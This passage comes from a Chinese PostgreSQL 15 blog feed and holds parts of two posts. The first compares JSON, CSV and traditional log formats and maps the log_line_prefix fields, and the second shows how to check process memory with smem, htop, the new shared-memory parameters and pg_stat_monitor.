class="punctuation">,</span><span class="attr">&quot;user&quot;</span><span class="punctuation">:</span><span class="string">&quot;sbtest&quot;</span><span class="punctuation">,</span><span class="attr">&quot;dbname&quot;</span><span class="punctuation">:</span><span class="string">&quot;postgres&quot;</span><span class="punctuation">,</span><span class="attr">&quot;pid&quot;</span><span class="punctuation">:</span><span class="number">1943</span><span class="punctuation">,</span><span class="attr">&quot;remote_host&quot;</span><span class="punctuation">:</span><span class="string">&quot;192.168.8.121&quot;</span><span class="punctuation">,</span><span class="attr">&quot;remote_port&quot;</span><span class="punctuation">:</span><span class="number">47618</span><span class="punctuation">,</span><span class="attr">&quot;session_id&quot;</span><span class="punctuation">:</span><span class="string">&quot;64088579.797&quot;</span><span class="punctuation">,</span><span class="attr">&quot;line_num&quot;</span><span class="punctuation">:</span><span class="number">3</span><span class="punctuation">,</span><span class="attr">&quot;ps&quot;</span><span class="punctuation">:</span><span class="string">&quot;idle&quot;</span><span class="punctuation">,</span><span class="attr">&quot;session_start&quot;</span><span class="punctuation">:</span><span class="string">&quot;2023-03-08 20:54:17 CST&quot;</span><span class="punctuation">,</span><span class="attr">&quot;txid&quot;</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">,</span><span class="attr">&quot;error_severity&quot;</span><span class="punctuation">:</span><span class="string">&quot;LOG&quot;</span><span class="punctuation">,</span><span class="attr">&quot;message&quot;</span><span class="punctuation">:</span><span class="string">&quot;disconnection: session time: 0:00:11.618 user=sbtest database=postgres host=192.168.8.121 port=47618&quot;</span><span class="punctuation">,</span><span class="attr">&quot;application_name&quot;</span><span class="punctuation">:</span><span class="string">&quot;psql&quot;</span><span class="punctuation">,</span><span class="attr">&quot;backend_type&quot;</span><span class="punctuation">:</span><span class="string">&quot;client backend&quot;</span><span class="punctuation">,</span><span class="attr">&quot;query_id&quot;</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></div>
<p>对照传统日志文件和 csv 格式日志文件查看。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">- log</span><br><span class="line">a:, u:, d:, r:, h:, b:postmaster, p:1254, P:, t:2023-03-08 20:29:31 CST, m:2023-03-08 20:29:31.596 CST, n:1678278571.596, Q:0, i:, e:00000, c:64087fab.4e6, l:3, s:2023-03-08 20:29:31 CST, v:, x:0, q:LOG:  ending log output to stderr</span><br><span class="line">a:, u:, d:, r:, h:, b:postmaster, p:1254, P:, t:2023-03-08 20:29:31 CST, m:2023-03-08 20:29:31.596 CST, n:1678278571.596, Q:0, i:, e:00000, c:64087fab.4e6, l:4, s:2023-03-08 20:29:31 CST, v:, x:0, q:HINT:  Future log output will go to log destination &quot;csvlog, jsonlog&quot;.</span><br><span class="line"></span><br><span class="line">- csv</span><br><span class="line">2023-03-08 20:29:31.596 CST,,,1254,,64087fab.4e6,1,,2023-03-08 20:29:31 CST,,0,LOG,00000,&quot;ending log output to stderr&quot;,,&quot;Future log output will go to log destination &quot;&quot;csvlog, jsonlog&quot;&quot;.&quot;,,,,,,,&quot;&quot;,&quot;postmaster&quot;,,0</span><br></pre></td></tr></table></figure></div>
<p>至少可以观测到三点：</p>
<ol>
<li>json 格式日志由于自身属性原因，日志大小会大于 csv 格式，甚至大小翻倍。</li>
<li>但是，json 格式的有点也很明显，对于各种日志分析系统友好，不需要再转格式，也不会出现 csv 多行转换的问题。</li>
<li>json/csv 的格式相对固定，而传统日志的格式可以自定义。</li>
</ol>
<p>由于我目前还是 PG 入门级选手，对于第三点，也是在反复实验中发现，<code>log_line_prefix</code> 参数设定并不会影响到 json/csv 格式文件。<br>
同时，查阅源码 (src\backend\utils\error*log.c) 后这一推测得到验证。</p>
<p>传统日志文件可以自定义格式，同时指定了一些特殊值，便于定制化编排日志格式，上文的实例中就是按照这种格式进行编排：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">log_line_prefix = &#x27;a:%a, u:%u, d:%d, r:%r, h:%h, b:%b, p:%p, P:%P, t:%t, m:%m, n:%n, Q:%Q, i:%i, e:%e, c:%c, l:%l, s:%s, v:%v, x:%x, q:%q&#x27;</span><br></pre></td></tr></table></figure></div>
<p>经过若干小时的梳理，已将传统日志和 json 日志的字段对应整理如下：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line"># special values:</span><br><span class="line">#   %a = application name                               -&gt; json : application_name (psql, HeidiSQL)</span><br><span class="line">#   %u = user name                                      -&gt; json : user</span><br><span class="line">#   %d = database name                                  -&gt; json : dbname</span><br><span class="line">#   %r = remote host and port                           -&gt; json : remote_host, remote_port</span><br><span class="line">#   %h = remote host                                    -&gt; json : remote_host ([local])</span><br><span class="line">#   %b = backend type                                   -&gt; json : backend_type (postmaster, not initialized, client backend)</span><br><span class="line">#   %p = process ID                                     -&gt; json : pid</span><br><span class="line">#   %P = process ID of parallel group leader            -&gt; json : leader_pid</span><br><span class="line">#   %t = timestamp without milliseconds                 -&gt; json : --</span><br><span class="line">#   %m = timestamp with milliseconds                    -&gt; json : timestamp</span><br><span class="line">#   %n = timestamp with milliseconds (as a Unix epoch)  -&gt; json : --</span><br><span class="line">#   %Q = query ID (0 if none or not computed)           -&gt; json : query_id</span><br><span class="line">#   %i = command tag                                    -&gt; json : ps (authentication, idle, ALTER SYSTEM, SELECT)</span><br><span class="line">#   %e = SQL state                                      -&gt; json : state_code</span><br><span class="line">#   %c = session ID                                     -&gt; json : session_id (%lx.%x)</span><br><span class="line">#   %l = session line number                            -&gt; json : line_num</span><br><span class="line">#   %s = session start timestamp                        -&gt; json : session_start</span><br><span class="line">#   %v = virtual transaction ID                         -&gt; json : vxid (%d/%u)</span><br><span class="line">#   %x = transaction ID (0 if none)                     -&gt; json : txid</span><br><span class="line">#   %q = stop here in non-session                       -&gt; json : message, hint, detail, context</span><br></pre></td></tr></table></figure></div>
<p>json 日志仍有若干字段未匹配：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">error_severity (LOG, ERROR)</span><br><span class="line">internal_query, internal_position</span><br><span class="line">statement, cursor_position</span><br><span class="line">func_name, file_name, file_line_num</span><br></pre></td></tr></table></figure></div>
<p>关于 json 日志，上文提到的多行展示，可以参考如下示例：</p>
<ul>
<li>截取一段日志内容</li>
</ul>
<div class="highlight-container" data-rel="Json"><figure class="iseeu highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;timestamp&quot;</span><span class="punctuation">:</span><span class="string">&quot;2023-03-08 23:41:48.152 CST&quot;</span><span class="punctuation">,</span><span class="attr">&quot;user&quot;</span><span class="punctuation">:</span><span class="string">&quot;postgres&quot;</span><span class="punctuation">,</span><span class="attr">&quot;dbname&quot;</span><span class="punctuation">:</span><span class="string">&quot;postgres&quot;</span><span class="punctuation">,</span><span class="attr">&quot;pid&quot;</span><span class="punctuation">:</span><span class="number">4601</span><span class="punctuation">,</span><span class="attr">&quot;remote_host&quot;</span><span class="punctuation">:</span><span class="string">&quot;[local]&quot;</span><span class="punctuation">,</span><span class="attr">&quot;session_id&quot;</span><span class="punctuation">:</span><span class="string">&quot;6408ac11.11f9&quot;</span><span class="punctuation">,</span><span class="attr">&quot;line_num&quot;</span><span class="punctuation">:</span><span class="number">6</span><span class="punctuation">,</span><span class="attr">&quot;ps&quot;</span><span class="punctuation">:</span><span class="string">&quot;idle&quot;</span><span class="punctuation">,</span><span class="attr">&quot;session_start&quot;</span><span class="punctuation">:</span><span class="string">&quot;2023-03-08 23:38:57 CST&quot;</span><span class="punctuation">,</span><span class="attr">&quot;vxid&quot;</span><span class="punctuation">:</span><span class="string">&quot;3/5&quot;</span><span class="punctuation">,</span><span class="attr">&quot;txid&quot;</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">,</span><span class="attr">&quot;error_severity&quot;</span><span class="punctuation">:</span><span class="string">&quot;LOG&quot;</span><span class="punctuation">,</span><span class="attr">&quot;message&quot;</span><span class="punctuation">:</span><span class="string">&quot;statement: SELECT d.datname as \&quot;Name\&quot;,\n       pg_catalog.pg_get_userbyid(d.datdba) as \&quot;Owner\&quot;,\n       pg_catalog.pg_encoding_to_char(d.encoding) as \&quot;Encoding\&quot;,\n       d.datcollate as \&quot;Collate\&quot;,\n       d.datctype as \&quot;Ctype\&quot;,\n       d.daticulocale as \&quot;ICU Locale\&quot;,\n       CASE d.datlocprovider WHEN &#x27;c&#x27; THEN &#x27;libc&#x27; WHEN &#x27;i&#x27; THEN &#x27;icu&#x27; END AS \&quot;Locale Provider\&quot;,\n       pg_catalog.array_to_string(d.datacl, E&#x27;\\n&#x27;) AS \&quot;Access privileges\&quot;\nFROM pg_catalog.pg_database d\nORDER BY 1;&quot;</span><span class="punctuation">,</span><span class="attr">&quot;application_name&quot;</span><span class="punctuation">:</span><span class="string">&quot;psql&quot;</span><span class="punctuation">,</span><span class="attr">&quot;backend_type&quot;</span><span class="punctuation">:</span><span class="string">&quot;client backend&quot;</span><span class="punctuation">,</span><span class="attr">&quot;query_id&quot;</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></div>
<ul>
<li>将日志中的 message 字段中的 statement 查询语句提取出来，并进行过滤、转化，可得到以下结果。</li>
</ul>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">[root@centos7 log]# grep pg_get_userbyid postgresql-2023-03-08_233853.json | jq &#x27;.message | split(&quot;: &quot;)[1] | .[:-1]&#x27; | json</span><br><span class="line">SELECT d.datname as &quot;Name&quot;,</span><br><span class="line">       pg_catalog.pg_get_userbyid(d.datdba) as &quot;Owner&quot;,</span><br><span class="line">       pg_catalog.pg_encoding_to_char(d.encoding) as &quot;Encoding&quot;,</span><br><span class="line">       d.datcollate as &quot;Collate&quot;,</span><br><span class="line">       d.datctype as &quot;Ctype&quot;,</span><br><span class="line">       d.daticulocale as &quot;ICU Locale&quot;,</span><br><span class="line">       CASE d.datlocprovider WHEN &#x27;c&#x27; THEN &#x27;libc&#x27; WHEN &#x27;i&#x27; THEN &#x27;icu&#x27; END AS &quot;Locale Provider&quot;,</span><br><span class="line">       pg_catalog.array_to_string(d.datacl, E&#x27;\n&#x27;) AS &quot;Access privileges&quot;</span><br><span class="line">FROM pg_catalog.pg_database d</span><br><span class="line">ORDER BY 1</span><br><span class="line">[root@centos7 log]# </span><br></pre></td></tr></table></figure></div>
<img  alt="p1.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20230309-51fc13c8-1221-4d95-b57b-b767b65086c4.png"
                      referrerpolicy="no-referrer"
                >
<ul>
<li>将格式化好的 SQL 语句放到 psql 中执行，得到如下结果。</li>
</ul>
<img  alt="p2.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20230309-68e5e06f-f058-47f9-abb8-2eb463a49904.png"
                      referrerpolicy="no-referrer"
                >
<h2 id="End">End</h2>
<p>到此，先告一段落，夜深了要休息了。</p>
<hr>
<p><a class="link"   href="https://www.modb.pro/db/617900" >https://www.modb.pro/db/617900 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>
<a class="link"   href="https://pgfans.cn/a/2263" >https://pgfans.cn/a/2263 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<hr class="footnotes-sep">
<section class="footnotes">
<ol class="footnotes-list">
<li id="fn1" class="footnote-item"><p><a class="link"   href="https://www.postgresql.org/docs/release/15.0/" >https://www.postgresql.org/docs/release/15.0/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> <a href="#fnref1" class="footnote-backref">↩︎</a></p>
</li>
</ol>
</section>
]]></content>
      <categories>
        <category>PostgreSQL</category>
        <category>PostgreSQL 15</category>
      </categories>
      <tags>
        <tag>log</tag>
        <tag>postgresql</tag>
        <tag>json</tag>
        <tag>postgresql 15</tag>
        <tag>jsonlog</tag>
      </tags>
  </entry>
  <entry>
    <title>【PG15】如何查看 PostgreSQL 进程占用内存情况</title>
    <url>/2023/postgresql/pg-15-progress-memory/</url>
    <content><![CDATA[<h2 id="BG">BG</h2>
<p>PG 学习群中提及了复杂且很难理解的 PostgreSQL 内存结构，但是有两个常用的必备工具是要学会如何使用的。</p>
<img  alt="p1.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20230305-dc7512cb-cd63-4a46-b1ec-5209a64280ad.png"
                      referrerpolicy="no-referrer"
                >
<p>如图所示，上半部分是 <code>smem</code> 工具，下半部分是 <code>htop</code> 工具。</p>
<p>这两个是系统工具，OS层面使用，除此之外，还有 2 个 PG 15 引入的参数，以及几个 PG 插件，以 postgresql 的 extension 形式安装，当然还有 PostgreSQL ，下面会逐一说明。</p>
<h2 id="smem">smem</h2>
<p>SMEM 是一个内存报告工具，可以根据GNU通用公共许可证第2版或更高版本的条款使用和分发。<br>
可以通过 yum 直接安装，但其逻辑本身是通过 Python 语言实现。</p>
<p>扫描系统的 <code>/proc/</code> 路径，抓取并处理相关信息。输入选项 <code>--help</code> 即可打印出所有选项。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">smem --<span class="built_in">help</span></span></span><br><span class="line">Usage: smem [options]</span><br><span class="line"></span><br><span class="line">Options:</span><br><span class="line">  -h, --help            show this help message and exit</span><br><span class="line">  -H, --no-header       disable header line</span><br><span class="line">  -c COLUMNS, --columns=COLUMNS</span><br><span class="line">                        columns to show</span><br><span class="line">  -t, --totals          show totals</span><br><span class="line">  -R REALMEM, --realmem=REALMEM</span><br><span class="line">                        amount of physical RAM</span><br><span class="line">  -K KERNEL, --kernel=KERNEL</span><br><span class="line">                        path to kernel image</span><br><span class="line">  -m, --mappings        show mappings</span><br><span class="line">  -u, --users           show users</span><br><span class="line">  -w, --system          show whole system</span><br><span class="line">  -P PROCESSFILTER, --processfilter=PROCESSFILTER</span><br><span class="line">                        process filter regex</span><br><span class="line">  -M MAPFILTER, --mapfilter=MAPFILTER</span><br><span class="line">                        map filter regex</span><br><span class="line">  -U USERFILTER, --userfilter=USERFILTER</span><br><span class="line">                        user filter regex</span><br><span class="line">  -n, --numeric         numeric output</span><br><span class="line">  -s SORT, --sort=SORT  field to sort on</span><br><span class="line">  -r, --reverse         reverse sort</span><br><span class="line">  -p, --percent         show percentage</span><br><span class="line">  -k, --abbreviate      show unit suffixes</span><br><span class="line">  --pie=PIE             show pie graph</span><br><span class="line">  --bar=BAR             show bar graph</span><br><span class="line">  -S SOURCE, --source=SOURCE</span><br><span class="line">                        /proc data source</span><br></pre></td></tr></table></figure></div>
<p>列举几个日常用法:</p>
<ol>
<li>查看 postgres 用户的相关进程及内存使用情况</li>
</ol>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">smem -U postgres</span></span><br><span class="line">  PID User     Command                         Swap      USS      PSS      RSS</span><br><span class="line">2294087 postgres postgres: archiver                 0      128      281     1952</span><br><span class="line">2294081 postgres postgres: logger                   0      204      348     1988</span><br><span class="line">2294088 postgres postgres: stats collector          0      268      424     2152</span><br><span class="line">2294089 postgres postgres: logical replicati        0      496      852     2912</span><br><span class="line">2294086 postgres postgres: autovacuum launch        0      652     1091     3304</span><br><span class="line">3037181 postgres -bash                              0     1348     1575     3064</span><br><span class="line">2294084 postgres postgres: background writer        0      224     6052    19192</span><br><span class="line">3037422 postgres python /bin/smem -U postgre        0     6028     6302     7404</span><br><span class="line">2294083 postgres postgres: checkpointer             0      616     6616    20128</span><br><span class="line">2294085 postgres postgres: walwriter                0      208     8581    18612</span><br><span class="line">2294080 postgres /opt/postgresql/bin/postgre        0    51252    65979    89356</span><br></pre></td></tr></table></figure></div>
<ol start="2">
<li>格式化输出数字，转为更为优雅的展示格式, 并计算打印总和。</li>
</ol>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">smem -U postgres -k <span class="string">&#x27;M&#x27;</span> -t</span></span><br><span class="line">  PID User     Command                         Swap      USS      PSS      RSS</span><br><span class="line">2294087 postgres postgres: archiver                 0   128.0K   281.0K     1.9M</span><br><span class="line">2294081 postgres postgres: logger                   0   204.0K   348.0K     1.9M</span><br><span class="line">2294088 postgres postgres: stats collector          0   268.0K   424.0K     2.1M</span><br><span class="line">2294089 postgres postgres: logical replicati        0   496.0K   852.0K     2.8M</span><br><span class="line">2294086 postgres postgres: autovacuum launch        0   652.0K     1.1M     3.2M</span><br><span class="line">3037181 postgres -bash                              0     1.3M     1.5M     3.0M</span><br><span class="line">2294084 postgres postgres: background writer        0   224.0K     5.9M    18.7M</span><br><span class="line">3037559 postgres python /bin/smem -U postgre        0     5.9M     6.2M     7.2M</span><br><span class="line">2294083 postgres postgres: checkpointer             0   616.0K     6.5M    19.7M</span><br><span class="line">2294085 postgres postgres: walwriter                0   208.0K     8.4M    18.2M</span><br><span class="line">2294080 postgres /opt/postgresql/bin/postgre        0    50.1M    64.4M    87.3M</span><br><span class="line">-------------------------------------------------------------------------------</span><br><span class="line">   11 1                                           0    60.0M    95.8M   166.1M</span><br></pre></td></tr></table></figure></div>
<ol start="3">
<li>按 PSS 进行逆序排序。</li>
</ol>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">smem -U postgres -k <span class="string">&#x27;M&#x27;</span> -t -s pss -r</span></span><br><span class="line">  PID User     Command                         Swap      USS      PSS      RSS</span><br><span class="line">2294080 postgres /opt/postgresql/bin/postgre        0    50.1M    64.4M    87.3M</span><br><span class="line">2294085 postgres postgres: walwriter                0   208.0K     8.4M    18.2M</span><br><span class="line">2294083 postgres postgres: checkpointer             0   616.0K     6.5M    19.7M</span><br><span class="line">3037672 postgres python /bin/smem -U postgre        0     5.9M     6.2M     7.2M</span><br><span class="line">2294084 postgres postgres: background writer        0   224.0K     5.9M    18.7M</span><br><span class="line">3037181 postgres -bash                              0     1.3M     1.5M     3.0M</span><br><span class="line">2294086 postgres postgres: autovacuum launch        0   652.0K     1.1M     3.2M</span><br><span class="line">2294089 postgres postgres: logical replicati        0   496.0K   852.0K     2.8M</span><br><span class="line">2294088 postgres postgres: stats collector          0   268.0K   424.0K     2.1M</span><br><span class="line">2294081 postgres postgres: logger                   0   204.0K   348.0K     1.9M</span><br><span class="line">2294087 postgres postgres: archiver                 0   128.0K   281.0K     1.9M</span><br><span class="line">-------------------------------------------------------------------------------</span><br><span class="line">   11 1                                           0    60.0M    95.8M   166.1M</span><br></pre></td></tr></table></figure></div>
<ol start="4">
<li>如需展示 VSS 需要指定列</li>
</ol>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">smem -U postgres -k <span class="string">&#x27;M&#x27;</span> -s vss -r -c <span class="string">&#x27;command uss pss rss vss&#x27;</span></span></span><br><span class="line">Command                          USS      PSS      RSS      VSS</span><br><span class="line">postgres: autovacuum launch   652.0K     1.1M     3.2M     2.3G</span><br><span class="line">postgres: logical replicati   496.0K   852.0K     2.8M     2.3G</span><br><span class="line">postgres: checkpointer        616.0K     6.5M    19.7M     2.3G</span><br><span class="line">postgres: background writer   224.0K     5.9M    18.7M     2.3G</span><br><span class="line">postgres: walwriter           208.0K     8.4M    18.2M     2.3G</span><br><span class="line">/opt/postgresql/bin/postgre    50.1M    64.4M    87.3M     2.3G</span><br><span class="line">postgres: stats collector     268.0K   424.0K     2.1M   229.8M</span><br><span class="line">postgres: archiver            128.0K   281.0K     1.9M   229.7M</span><br><span class="line">postgres: logger              200.0K   344.0K     1.9M   227.6M</span><br><span class="line">-bash                           1.5M     1.7M     3.1M   113.9M</span><br><span class="line">python /bin/smem -U postgre     5.9M     6.2M     7.2M    44.1M</span><br></pre></td></tr></table></figure></div>
<p>上述示例中，出现几个专业词汇缩写，其含义如下：</p>
<ul>
<li>Swap: 所消耗的交换空间量(忽略共享)</li>
<li>USS: Unique Set Size 进程独自占用的物理内存</li>
<li>PSS: Proportional Set Size 实际使用的物理内存 (包含共享)</li>
<li>RSS: Resident Set Size 实际使用物理内存(忽略共享)</li>
<li>VSS: Virtual Set Size 虚拟耗用内存(映射的虚拟内存总数)</li>
</ul>
<p>最后，smem 还可以输出饼图，图形化的方式，展示各进程的内存占比。</p>
<h2 id="htop">htop</h2>
<p>htop 是一个免费的(GPL)基于 ncurses(提供字符终端处理库) 的Linux进程查看器。<br>
它与 top 类似，但允许您垂直和水平滚动，以便您可以看到系统上运行的所有进程及其完整的命令行，以及将它们视为进程树。</p>
<img  alt="p2.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20230306-3e218cdc-9d0a-4ffe-85f9-6ad553a7435e.PNG"
                      referrerpolicy="no-referrer"
                >
<p>目前，htop 最新版本为 v3.2.2, 感兴趣的同学可以自行下载编译使用。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">./htop --<span class="built_in">help</span></span></span><br><span class="line">htop 3.2.2</span><br><span class="line">(C) 2004-2019 Hisham Muhammad. (C) 2020-2023 htop dev team.</span><br><span class="line">Released under the GNU GPLv2+.</span><br><span class="line">...</span><br></pre></td></tr></table></figure></div>
<p>额外需要注意的是，htop 带有 kill 功能，此功能请慎用。</p>
<h2 id="shared-memory-size-shared-memory-size-in-huge-pages">shared_memory_size &amp; shared_memory_size_in_huge_pages</h2>
<p>在 <a class="link"   href="https://www.postgresql.org/docs/release/15.0/" >PostgreSQL 15.0 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 的发版说明中有介绍到新增了两个参数。</p>
<h3 id="shared-memory-size">shared_memory_size</h3>
<p>添加服务器变量 <a class="link"   href="https://www.postgresql.org/docs/15/runtime-config-preset.html#GUC-SHARED-MEMORY-SIZE" >shared_memory_size <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 来报告已分配共享内存的大小(Nathan Bossart)<br>
报告主共享内存区域的大小，四舍五入到最近的兆字节。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">postgres=<span class="meta"># show shared_memory_size;</span></span><br><span class="line"> shared_memory_size</span><br><span class="line">--------------------</span><br><span class="line"> <span class="number">145</span>MB</span><br><span class="line">(<span class="number">1</span> row)</span><br></pre></td></tr></table></figure></div>
<h3 id="shared-memory-size-in-huge-pages">shared_memory_size_in_huge_pages</h3>
<p>添加服务器变量 shared_memory_size_in_huge_pages 以报告所需的巨大内存页的数量(Nathan Bossart)<br>
根据指定的 huge_page_size 报告主共享内存区域所需的大页数。 如果不支持大页面，则该值为-1。<br>
该设置仅在Linux操作系统下支持。 在其他平台上它总是被设置为-1。</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line">postgres<span class="operator">=</span># <span class="keyword">show</span> shared_memory_size_in_huge_pages;</span><br><span class="line"> shared_memory_size_in_huge_pages</span><br><span class="line"><span class="comment">----------------------------------</span></span><br><span class="line"> <span class="number">73</span></span><br><span class="line">(<span class="number">1</span> <span class="type">row</span>)</span><br></pre></td></tr></table></figure></div>
<p>另外一个知识点，PG15 扩展了元命令 <code>\dconfig</code> 可以一次性查看若干参数设定。</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line">(postgres@[<span class="keyword">local</span>]) [postgres] <span class="number">12</span>:<span class="number">34</span>:<span class="number">51</span># \dconfig<span class="operator">+</span> <span class="operator">*</span>share<span class="operator">*</span></span><br><span class="line">                           List <span class="keyword">of</span> configuration parameters</span><br><span class="line"><span class="operator">+</span><span class="comment">----------------------------------+-------+---------+------------+-------------------+</span></span><br><span class="line"><span class="operator">|</span>            <span class="keyword">Parameter</span>             <span class="operator">|</span> <span class="keyword">Value</span> <span class="operator">|</span>  Type   <span class="operator">|</span>  Context   <span class="operator">|</span> Access privileges <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------------------------------+-------+---------+------------+-------------------+</span></span><br><span class="line"><span class="operator">|</span> dynamic_shared_memory_type       <span class="operator">|</span> posix <span class="operator">|</span> enum    <span class="operator">|</span> postmaster <span class="operator">|</span>                   <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> min_dynamic_shared_memory        <span class="operator">|</span> <span class="number">0</span>     <span class="operator">|</span> <span class="type">integer</span> <span class="operator">|</span> postmaster <span class="operator">|</span>                   <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> shared_buffers                   <span class="operator">|</span> <span class="number">128</span>MB <span class="operator">|</span> <span class="type">integer</span> <span class="operator">|</span> postmaster <span class="operator">|</span>                   <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> shared_memory_size               <span class="operator">|</span> <span class="number">143</span>MB <span class="operator">|</span> <span class="type">integer</span> <span class="operator">|</span> internal   <span class="operator">|</span>                   <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> shared_memory_size_in_huge_pages <span class="operator">|</span> <span class="number">72</span>    <span class="operator">|</span> <span class="type">integer</span> <span class="operator">|</span> internal   <span class="operator">|</span>                   <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> shared_memory_type               <span class="operator">|</span> mmap  <span class="operator">|</span> enum    <span class="operator">|</span> postmaster <span class="operator">|</span>                   <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> shared_preload_libraries         <span class="operator">|</span>       <span class="operator">|</span> string  <span class="operator">|</span> postmaster <span class="operator">|</span>                   <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------------------------------+-------+---------+------------+-------------------+</span></span><br><span class="line">(<span class="number">7</span> <span class="keyword">rows</span>)</span><br></pre></td></tr></table></figure></div>
<p>可以看到当前 PG 的设定，<a class="link"   href="https://www.postgresql.org/docs/current/runtime-config-resource.html#GUC-DYNAMIC-SHARED-MEMORY-TYPE" >dynamic_shared_memory_type <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 为 posix ，该参数指定服务器应使用的动态共享内存实现。 可能的值有posix(使用shm_open分配posix共享内存)、sysv(通过shmget分配System V共享内存)、windows(使用windows共享内存)和mmap(使用存储在data目录中的内存映射文件模拟共享内存)。</p>
<h2 id="pg-stat-monitor">pg_stat_monitor</h2>
<p>pg_stat_monitor 是由 Percona 公司开发的 PostgreSQL 的查询性能监控工具。 它在单个视图中收集性能统计信息并提供查询性能洞察。 这些见解允许数据库用户了解查询起源、执行、计划统计信息和详细信息、查询信息和元数据。 这极大地提高了可观察性，使用户能够调试和调优查询性能。</p>
<p>该插件，编译安装好之后，需要加入到预加载配置项，并重新启动 postgres。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">shared_preload_libraries=&#x27;pg_stat_monitor&#x27;</span><br></pre></td></tr></table></figure></div>
<p>安装后，可通过表格查询某条查询语句造成的共享块变动信息。</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> </span><br><span class="line"> userid, datname, queryid, </span><br><span class="line"> shared_blks_hit, shared_blks_read, shared_blks_dirtied, shared_blks_written </span><br><span class="line"> <span class="keyword">from</span> pg_stat_monitor</span><br><span class="line"> <span class="keyword">order</span> <span class="keyword">by</span> shared_blks_hit <span class="keyword">desc</span>;</span><br></pre></td></tr></table></figure></div>
<p>输出如下：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">+--------+----------+----------------------+-----------------+------------------+---------------------+---------------------+</span><br><span class="line">| userid | datname  |       queryid        | shared_blks_hit | shared_blks_read | shared_blks_dirtied | shared_blks_written |</span><br><span class="line">+--------+----------+----------------------+-----------------+------------------+---------------------+---------------------+</span><br><span class="line">|     10 | postgres | -7568047705441758065 |             186 |                0 |                   0 |                   0 |</span><br><span class="line">|     10 | postgres | -7568047705441758065 |             183 |                0 |                   0 |                   0 |</span><br><span class="line">|     10 | postgres |  3798936806175822236 |               7 |                0 |                   0 |                   0 |</span><br><span class="line">|     10 | postgres | -3691512427099624923 |               4 |                0 |                   0 |                   0 |</span><br><span class="line">|     10 | postgres | -3691512427099624923 |               4 |                0 |                   0 |                   0 |</span><br><span class="line">|     10 | postgres |  3798936806175822236 |               4 |                0 |                   0 |                   0 |</span><br><span class="line">|     10 | postgres | -4203261276791970850 |               3 |                0 |                   0 |                   0 |</span><br><span class="line">|     10 | postgres |  -821424691740446851 |               0 |                0 |                   0 |                   0 |</span><br><span class="line">|     10 | postgres | -4203261276791970850 |               0 |                0 |                   0 |                   0 |</span><br><span class="line">|     10 | postgres |  7280225642777516882 |               0 |                0 |                   0 |                   0 |</span><br><span class="line">|     10 | postgres | -9125306597209436601 |               0 |                0 |                   0 |                   0 |</span><br><span class="line">|     10 | postgres |  2301278004764654168 |               0 |                0 |                   0 |                   0 |</span><br><span class="line">|     10 | postgres |   229654144954915736 |               0 |                0 |                   0 |                   0 |</span><br><span class="line">|     10 | 